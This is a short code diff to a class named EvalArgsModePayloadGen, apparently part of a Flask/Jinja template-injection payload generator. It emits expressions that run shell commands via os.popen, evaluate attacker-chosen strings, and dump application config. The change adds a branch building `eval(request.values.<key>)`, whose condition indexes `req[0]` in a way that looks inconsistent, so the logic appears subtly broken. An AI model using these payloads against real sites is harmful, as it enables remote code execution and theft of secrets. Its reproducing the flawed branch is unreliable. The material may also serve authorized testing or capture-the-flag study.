@@ -132,10 +132,21 @@ class EvalArgsModePayloadGen:
             return f"__import__('os').popen({repr(args[0])}).read()", self.will_print
         elif gen_type == EVAL:
             req = args[0]
-            assert (
-                req[0] == STRING
-            ), "Only eval string is supported but inputs is " + repr(req)
-            return f"eval({repr(req[1])})", self.will_print
+            if req[0] == STRING:
+                return f"eval({req[1]!r})", self.will_print
+            elif (
+                req[0] == ITEM
+                and req[0][1][0] == ATTRIBUTE
+                and req[0][1][1] == "values"
+                and req[0][1][0][1][0] == FLASK_CONTEXT_VAR
+                and req[0][1][0][1][1] == "request"
+            ):
+                # i wish i can use `match`
+                # its something like request.values.xxx
+                key = req[1]
+                return f"eval(request.values.{key})", self.will_print
+            else:
+                assert False, f"Unsupported payload {req=}"
         elif gen_type == CONFIG:
             return (
                 "[v.config for v in sys.modules['__main__'].__dict__.values()"
